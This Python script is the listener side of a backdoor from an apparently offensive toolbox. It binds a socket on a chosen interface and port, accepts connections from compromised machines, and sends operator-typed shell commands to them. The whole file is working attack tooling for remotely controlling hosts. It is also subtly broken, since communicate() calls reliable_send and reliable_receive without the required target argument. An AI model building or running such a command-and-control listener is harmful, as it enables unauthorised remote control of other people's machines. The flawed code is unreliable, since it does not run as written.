import socket
import json
from toolbox.util.iputils import *

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()
print_backdoor_banner()
print_horizontal_delimiter()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
interfaces = get_interfaces_ipv4_dict()

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue

def communicate(ip):
    while(True):
        command = input("shell~%s" % str(ip))
        reliable_send(command)
        if command == "exit":
            break
        else:
            result = reliable_receive()
            print(result)

interface = input("# Step 1: Specify network interface to use\n"
                     f"# all interfaces: {interfaces}\n"
                     "# ex. wlan0\n")
LHOST = interfaces.get(interface)
print(f"[i] LHOST is set to {LHOST}")
LPORT = input("# Step 2: Specify listener port\n"
                     "# ex. 4444\n")
print(f"[i] LPORT is set to {LPORT}")
s.bind((LHOST, int(LPORT)))
MAX_SESSIONS = 5
if input(f"[?] Leave default number of socket parallel sessions of {MAX_SESSIONS}? (y/n)\n") == 'n':
    MAX_SESSIONS = input("# Specify number of socket parallel sessions\n")
s.listen(MAX_SESSIONS)
print("# Listening for incoming connections...")
while(True):
    target, ip = s.accept()
    print(f"[+] Started new communication with {ip}")
    communicate(ip)
